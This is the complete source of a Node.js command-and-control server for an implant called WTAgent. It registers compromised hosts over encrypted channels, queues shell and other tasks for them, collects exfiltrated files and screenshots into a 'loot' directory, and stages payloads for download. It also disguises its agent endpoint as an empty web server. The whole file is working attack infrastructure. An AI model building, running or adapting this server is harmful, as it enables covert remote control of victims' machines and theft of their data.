/**
 * wt_c2_server.js — WTAgent C2 Listener (Node.js)
 *
 * Standalone HTTPS server that:
 *   - Receives encrypted WTAgent registrations + check-ins
 *   - Queues operator tasks per agent
 *   - Returns results to operator via REST API
 *   - Stores uploaded files (exfil) to ./loot/
 *   - Serves staged files for agent download from ./stage/
 *
 * Usage:
 *   node wt_c2_server.js [--port 8443] [--key server.key] [--cert server.crt]
 *
 * First-time key generation:
 *   openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 3650 -nodes -subj "/CN=WTC2"
 *   openssl genrsa -out agent_unwrap.key 2048
 *   openssl rsa -in agent_unwrap.key -pubout -out agent_unwrap_pub.pem
 *   # Paste contents of agent_unwrap_pub.pem into WTAgent.cs Config.SERVER_PUBKEY
 *
 * Operator API (localhost-only by default):
 *   GET  /op/agents                   — list registered agents
 *   POST /op/task/<agentId>           — queue a task: {"type":"shell","arg":"whoami"}
 *   GET  /op/results/<agentId>        — get all results for agent
 *   GET  /op/loot                     — list uploaded files
 *   GET  /op/loot/<filename>          — download exfil file
 *   POST /op/stage/<filename>         — upload a file for agent to download
 *   DELETE /op/task/<agentId>/<taskId>— cancel a pending task
 */

'use strict';

const https   = require('https');
const http    = require('http');
const fs      = require('fs');
const path    = require('path');
const crypto  = require('crypto');
const url     = require('url');

// ─────────────────────────────────────────────────────────────────────────────
// Config
// ─────────────────────────────────────────────────────────────────────────────
const C2_PORT     = parseInt(process.argv[process.argv.indexOf('--port') + 1] || '8443', 10);
const OP_PORT     = 8444;               // Operator API port (bind to 127.0.0.1)
const KEY_FILE    = process.argv[process.argv.indexOf('--key')  + 1] || path.join(__dirname, 'server.key');
const CERT_FILE   = process.argv[process.argv.indexOf('--cert') + 1] || path.join(__dirname, 'server.crt');
const PRIV_KEY_FILE = path.join(__dirname, 'agent_unwrap.key');  // RSA private key to unwrap agent session keys
const LOOT_DIR    = path.join(__dirname, 'loot');
const STAGE_DIR   = path.join(__dirname, 'stage');
const LOG_FILE    = path.join(__dirname, 'wt_c2.log');

for (const d of [LOOT_DIR, STAGE_DIR]) {
    if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
}

// ─────────────────────────────────────────────────────────────────────────────
// Logging
// ─────────────────────────────────────────────────────────────────────────────
const logStream = fs.createWriteStream(LOG_FILE, { flags: 'a' });
function log(level, msg) {
    const line = `[${new Date().toISOString()}] [${level}] ${msg}`;
    console.log(line);
    logStream.write(line + '\n');
}

// ─────────────────────────────────────────────────────────────────────────────
// In-memory state
// ─────────────────────────────────────────────────────────────────────────────
const agents  = {};   // { agentId: { id, host, user, os, arch, ip, pid, lastSeen, sessionKey, hmacKey } }
const tasks   = {};   // { agentId: [ { task_id, type, arg, sleep, added, status } ] }
const results = {};   // { agentId: [ { task_id, type, out, b64, ts } ] }

// ─────────────────────────────────────────────────────────────────────────────
// RSA key (for unwrapping session keys from agents)
// ─────────────────────────────────────────────────────────────────────────────
let serverPrivateKey = null;
try {
    serverPrivateKey = fs.readFileSync(PRIV_KEY_FILE);
    log('INFO', 'Loaded RSA private key from ' + PRIV_KEY_FILE);
} catch (e) {
    log('WARN', 'RSA private key not found at ' + PRIV_KEY_FILE + ' — session key decryption disabled');
}

function unwrapSessionKey(wrappedBuf) {
    if (!serverPrivateKey) return null;
    try {
        return crypto.privateDecrypt(
            { key: serverPrivateKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' },
            wrappedBuf
        );
    } catch (e) {
        log('WARN', 'RSA unwrap failed: ' + e.message);
        return null;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Session crypto (per-agent AES-256-CBC + HMAC-SHA256)
// ─────────────────────────────────────────────────────────────────────────────
function decryptPayload(agentId, buf) {
    const agent = agents[agentId];
    if (!agent || !agent.sessionKey) return null;
    try {
        if (buf.length < 48) return null;
        const hmacOffset = buf.length - 32;
        const payloadPart = buf.slice(0, hmacOffset);
        const receivedHmac = buf.slice(hmacOffset);
        const expectedHmac = crypto.createHmac('sha256', agent.hmacKey).update(payloadPart).digest();
        if (!crypto.timingSafeEqual(receivedHmac, expectedHmac)) {
            log('WARN', `[${agentId}] HMAC mismatch`);
            return null;
        }
        const iv = payloadPart.slice(0, 16);
        const cipher = payloadPart.slice(16);
        const dec = crypto.createDecipheriv('aes-256-cbc', agent.sessionKey, iv);
        return Buffer.concat([dec.update(cipher), dec.final()]);
    } catch (e) { return null; }
}

function encryptPayload(agentId, plaintext) {
    const agent = agents[agentId];
    if (!agent || !agent.sessionKey) return null;
    try {
        const iv = crypto.randomBytes(16);
        const enc = crypto.createCipheriv('aes-256-cbc', agent.sessionKey, iv);
        const cipher = Buffer.concat([enc.update(plaintext), enc.final()]);
        const payload = Buffer.concat([iv, cipher]);
        const hmac = crypto.createHmac('sha256', agent.hmacKey).update(payload).digest();
        return Buffer.concat([payload, hmac]);
    } catch (e) { return null; }
}

// ─────────────────────────────────────────────────────────────────────────────
// Request body collector
// ─────────────────────────────────────────────────────────────────────────────
function collectBody(req) {
    return new Promise((resolve, reject) => {
        const chunks = [];
        req.on('data', c => chunks.push(c));
        req.on('end',  () => resolve(Buffer.concat(chunks)));
        req.on('error', reject);
    });
}

// ─────────────────────────────────────────────────────────────────────────────
// Route: POST /wta/register
// Wire format: [4-byte wrapped-key length BE] [wrapped-key] [encrypted-registration]
// ─────────────────────────────────────────────────────────────────────────────
async function handleRegister(req, res) {
    const body = await collectBody(req);
    try {
        if (body.length < 4) throw new Error('Too short');
        const keyLen = (body[0] << 24) | (body[1] << 16) | (body[2] << 8) | body[3];
        if (keyLen < 1 || keyLen > 512 || body.length < 4 + keyLen + 32) throw new Error('Bad length');

        const wrappedKey = body.slice(4, 4 + keyLen);
        const encPayload = body.slice(4 + keyLen);

        // Unwrap the 64-byte key material (32 AES + 32 HMAC)
        const keyMaterial = unwrapSessionKey(wrappedKey);
        if (!keyMaterial || keyMaterial.length < 64) throw new Error('Key unwrap failed');

        const sessionKey = keyMaterial.slice(0, 32);
        const hmacKey    = keyMaterial.slice(32, 64);

        // Temporarily store key to decrypt registration body
        const tmpId = '_tmp_' + Date.now();
        agents[tmpId] = { sessionKey, hmacKey };
        const plain = decryptPayload(tmpId, encPayload);
        delete agents[tmpId];
        if (!plain) throw new Error('Decrypt failed');

        const reg = JSON.parse(plain.toString('utf8'));
        const agentId = reg.id;
        if (!agentId) throw new Error('No id');

        agents[agentId] = {
            id: agentId, host: reg.host, user: reg.user,
            os: reg.os, arch: reg.arch, ip: reg.ip, pid: reg.pid,
            sessionKey, hmacKey,
            registeredAt: Date.now(), lastSeen: Date.now()
        };
        if (!tasks[agentId])   tasks[agentId]   = [];
        if (!results[agentId]) results[agentId] = [];

        log('INFO', `REGISTER: ${agentId} | ${reg.host}\\${reg.user} | ${reg.ip} | ${reg.os}`);

        const okBuf = encryptPayload(agentId, Buffer.from(JSON.stringify({ ok: true })));
        res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
        res.end(okBuf);
    } catch (e) {
        log('WARN', 'Register error: ' + e.message);
        res.writeHead(400); res.end();
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Route: POST /wta/checkin
// ─────────────────────────────────────────────────────────────────────────────
async function handleCheckin(req, res) {
    const body = await collectBody(req);
    try {
        // We need to identify which agent this is before we can decrypt
        // Strategy: try all registered agents (small agent count in lab)
        let plain = null, agentId = null;
        for (const id of Object.keys(agents)) {
            const p = decryptPayload(id, body);
            if (p) { plain = p; agentId = id; break; }
        }
        if (!plain) { res.writeHead(400); res.end(); return; }

        agents[agentId].lastSeen = Date.now();
        log('DEBUG', `CHECKIN: ${agentId}`);

        // Pop next pending task
        const pending = (tasks[agentId] || []).find(t => t.status === 'pending');
        if (pending) {
            pending.status = 'sent';
            const taskJson = JSON.stringify({
                task_id: pending.task_id, type: pending.type,
                arg: pending.arg || '', sleep: pending.sleep || 0
            });
            const enc = encryptPayload(agentId, Buffer.from(taskJson));
            log('INFO', `TASK→${agentId}: [${pending.task_id}] ${pending.type} ${pending.arg || ''}`);
            res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
            res.end(enc);
        } else {
            // No task — send ok
            const enc = encryptPayload(agentId, Buffer.from(JSON.stringify({ ok: true })));
            res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
            res.end(enc);
        }
    } catch (e) {
        log('WARN', 'Checkin error: ' + e.message);
        res.writeHead(400); res.end();
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Route: POST /wta/result
// ─────────────────────────────────────────────────────────────────────────────
async function handleResult(req, res) {
    const body = await collectBody(req);
    try {
        let plain = null, agentId = null;
        for (const id of Object.keys(agents)) {
            const p = decryptPayload(id, body);
            if (p) { plain = p; agentId = id; break; }
        }
        if (!plain) { res.writeHead(400); res.end(); return; }

        const r = JSON.parse(plain.toString('utf8'));
        agentId = r.id || agentId;
        agents[agentId].lastSeen = Date.now();

        // If this was a screenshot or binary upload, save to loot/
        if (r.b64 && r.out) {
            const ext = (r.type === 'screenshot') ? '.jpg' : '.bin';
            const fname = `${agentId}_${r.task}_${Date.now()}${ext}`;
            fs.writeFileSync(path.join(LOOT_DIR, fname), Buffer.from(r.out, 'base64'));
            log('INFO', `RESULT(file): ${agentId} task=${r.task} saved to loot/${fname}`);
            r.out = '[saved to loot/' + fname + ']';
        } else {
            log('INFO', `RESULT: ${agentId} task=${r.task} len=${(r.out||'').length}`);
        }

        // Mark task complete
        const taskList = tasks[agentId] || [];
        const t = taskList.find(x => x.task_id === r.task);
        if (t) t.status = 'done';

        // Store result
        (results[agentId] = results[agentId] || []).unshift({
            task_id: r.task, type: r.type || '?',
            out: r.out || '', ts: Date.now()
        });
        if (results[agentId].length > 500) results[agentId].length = 500;

        res.writeHead(200); res.end('{}');
    } catch (e) {
        log('WARN', 'Result error: ' + e.message);
        res.writeHead(400); res.end();
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Route: POST /wta/download  (agent requests a staged file)
// ─────────────────────────────────────────────────────────────────────────────
async function handleDownload(req, res) {
    const body = await collectBody(req);
    try {
        let plain = null, agentId = null;
        for (const id of Object.keys(agents)) {
            const p = decryptPayload(id, body);
            if (p) { plain = p; agentId = id; break; }
        }
        if (!plain) { res.writeHead(400); res.end(); return; }

        const r = JSON.parse(plain.toString('utf8'));
        const fname = path.basename(r.file || '');
        const fpath = path.join(STAGE_DIR, fname);
        if (!fs.existsSync(fpath)) { res.writeHead(404); res.end(); return; }

        const fileBytes = fs.readFileSync(fpath);
        const enc = encryptPayload(agentId, fileBytes);
        log('INFO', `DOWNLOAD: ${agentId} ← ${fname} (${fileBytes.length} bytes)`);
        res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
        res.end(enc);
    } catch (e) { res.writeHead(400); res.end(); }
}

// ─────────────────────────────────────────────────────────────────────────────
// Route: POST /wta/upload  (agent exfils a file)
// ─────────────────────────────────────────────────────────────────────────────
async function handleUpload(req, res) {
    const body = await collectBody(req);
    try {
        let plain = null, agentId = null;
        for (const id of Object.keys(agents)) {
            const p = decryptPayload(id, body);
            if (p) { plain = p; agentId = id; break; }
        }
        if (!plain) { res.writeHead(400); res.end(); return; }

        const r = JSON.parse(plain.toString('utf8'));
        const fname = path.basename(r.file || 'upload');
        const saveName = `${agentId}_${Date.now()}_${fname}`;
        fs.writeFileSync(path.join(LOOT_DIR, saveName), Buffer.from(r.data || '', 'base64'));
        log('INFO', `UPLOAD: ${agentId} → loot/${saveName}`);
        res.writeHead(200); res.end('{}');
    } catch (e) { res.writeHead(400); res.end(); }
}

// ─────────────────────────────────────────────────────────────────────────────
// Agent-facing router
// ─────────────────────────────────────────────────────────────────────────────
async function agentRouter(req, res) {
    const { pathname } = url.parse(req.url);
    if (req.method === 'POST' && pathname === '/wta/register')  return handleRegister(req, res);
    if (req.method === 'POST' && pathname === '/wta/checkin')   return handleCheckin(req, res);
    if (req.method === 'POST' && pathname === '/wta/result')    return handleResult(req, res);
    if (req.method === 'POST' && pathname === '/wta/download')  return handleDownload(req, res);
    if (req.method === 'POST' && pathname === '/wta/upload')    return handleUpload(req, res);
    // 404 for everything else (look like a blank web server)
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end('<html><body>Not Found</body></html>');
}

// ─────────────────────────────────────────────────────────────────────────────
// Operator API (localhost-only)
// ─────────────────────────────────────────────────────────────────────────────
function jsonResp(res, data, code = 200) {
    res.writeHead(code, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
    res.end(JSON.stringify(data, null, 2));
}

async function operatorRouter(req, res) {
    const parsed = url.parse(req.url, true);
    const p = parsed.pathname;

    if (req.method === 'OPTIONS') {
        res.writeHead(204, { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Methods': 'GET,POST,DELETE,OPTIONS', 'Access-Control-Allow-Headers': 'Content-Type' });
        return res.end();
    }

    // GET /op/agents
    if (req.method === 'GET' && p === '/op/agents') {
        const list = Object.values(agents).map(a => ({
            id: a.id, host: a.host, user: a.user, os: a.os,
            arch: a.arch, ip: a.ip, pid: a.pid,
            lastSeen: a.lastSeen,
            pendingTasks: (tasks[a.id] || []).filter(t => t.status === 'pending').length,
            totalResults: (results[a.id] || []).length
        }));
        return jsonResp(res, list);
    }

    // POST /op/task/<agentId>
    const taskMatch = p.match(/^\/op\/task\/([^\/]+)$/);
    if (req.method === 'POST' && taskMatch) {
        const agentId = taskMatch[1];
        if (!agents[agentId]) return jsonResp(res, { error: 'Unknown agent' }, 404);
        const body = await collectBody(req);
        let t;
        try { t = JSON.parse(body.toString()); } catch { return jsonResp(res, { error: 'Bad JSON' }, 400); }
        const task = {
            task_id: crypto.randomBytes(4).toString('hex').toUpperCase(),
            type: t.type || 'shell',
            arg:  t.arg  || '',
            sleep: t.sleep || 0,
            status: 'pending',
            added: Date.now()
        };
        (tasks[agentId] = tasks[agentId] || []).push(task);
        log('INFO', `OP TASK: ${agentId} ← [${task.task_id}] ${task.type} ${task.arg}`);
        return jsonResp(res, { ok: true, task_id: task.task_id });
    }

    // GET /op/results/<agentId>
    const resultMatch = p.match(/^\/op\/results\/([^\/]+)$/);
    if (req.method === 'GET' && resultMatch) {
        const agentId = resultMatch[1];
        return jsonResp(res, results[agentId] || []);
    }

    // GET /op/loot
    if (req.method === 'GET' && p === '/op/loot') {
        const files = fs.readdirSync(LOOT_DIR).map(f => {
            const st = fs.statSync(path.join(LOOT_DIR, f));
            return { name: f, size: st.size, mtime: st.mtimeMs };
        });
        return jsonResp(res, files);
    }

    // GET /op/loot/<filename>
    const lootGet = p.match(/^\/op\/loot\/(.+)$/);
    if (req.method === 'GET' && lootGet) {
        const fname = path.basename(lootGet[1]);
        const fpath = path.join(LOOT_DIR, fname);
        if (!fs.existsSync(fpath)) return jsonResp(res, { error: 'Not found' }, 404);
        res.writeHead(200, { 'Content-Type': 'application/octet-stream', 'Content-Disposition': `attachment; filename="${fname}"` });
        return fs.createReadStream(fpath).pipe(res);
    }

    // POST /op/stage/<filename>  — operator stages a file for agent download
    const stagePost = p.match(/^\/op\/stage\/(.+)$/);
    if (req.method === 'POST' && stagePost) {
        const fname = path.basename(stagePost[1]);
        const body  = await collectBody(req);
        fs.writeFileSync(path.join(STAGE_DIR, fname), body);
        log('INFO', `STAGE: ${fname} (${body.length} bytes)`);
        return jsonResp(res, { ok: true, file: fname, size: body.length });
    }

    // DELETE /op/task/<agentId>/<taskId>
    const delTask = p.match(/^\/op\/task\/([^\/]+)\/([^\/]+)$/);
    if (req.method === 'DELETE' && delTask) {
        const [, agentId, taskId] = delTask;
        const list = tasks[agentId] || [];
        const idx  = list.findIndex(t => t.task_id === taskId && t.status === 'pending');
        if (idx < 0) return jsonResp(res, { error: 'Task not found or not pending' }, 404);
        list.splice(idx, 1);
        return jsonResp(res, { ok: true });
    }

    // GET /op/tasks/<agentId>
    const taskList = p.match(/^\/op\/tasks\/([^\/]+)$/);
    if (req.method === 'GET' && taskList) {
        return jsonResp(res, tasks[taskList[1]] || []);
    }

    return jsonResp(res, { error: 'Not found' }, 404);
}

// ─────────────────────────────────────────────────────────────────────────────
// Start servers
// ─────────────────────────────────────────────────────────────────────────────
function startC2Server() {
    let tlsOpts;
    try {
        tlsOpts = { key: fs.readFileSync(KEY_FILE), cert: fs.readFileSync(CERT_FILE) };
        const srv = https.createServer(tlsOpts, (req, res) => {
            agentRouter(req, res).catch(e => { log('ERROR', e.message); res.writeHead(500); res.end(); });
        });
        srv.listen(C2_PORT, '0.0.0.0', () => log('INFO', `C2 HTTPS listening on :${C2_PORT}`));
    } catch (e) {
        log('WARN', 'TLS certs not found — falling back to HTTP C2 (insecure!)');
        const srv = http.createServer((req, res) => {
            agentRouter(req, res).catch(e => { log('ERROR', e.message); res.writeHead(500); res.end(); });
        });
        srv.listen(C2_PORT, '0.0.0.0', () => log('INFO', `C2 HTTP listening on :${C2_PORT}`));
    }
}

function startOperatorServer() {
    const srv = http.createServer((req, res) => {
        operatorRouter(req, res).catch(e => { log('ERROR', e.message); res.writeHead(500); res.end(); });
    });
    srv.listen(OP_PORT, '127.0.0.1', () => log('INFO', `Operator API listening on 127.0.0.1:${OP_PORT}`));
}

startC2Server();
startOperatorServer();

log('INFO', '─────────────────────────────────────────────────────────');
log('INFO', ' WTAgent C2 Listener started');
log('INFO', ' Agent endpoint: https://<yourip>:' + C2_PORT);
log('INFO', ' Operator API:   http://127.0.0.1:'  + OP_PORT + '/op/agents');
log('INFO', '─────────────────────────────────────────────────────────');
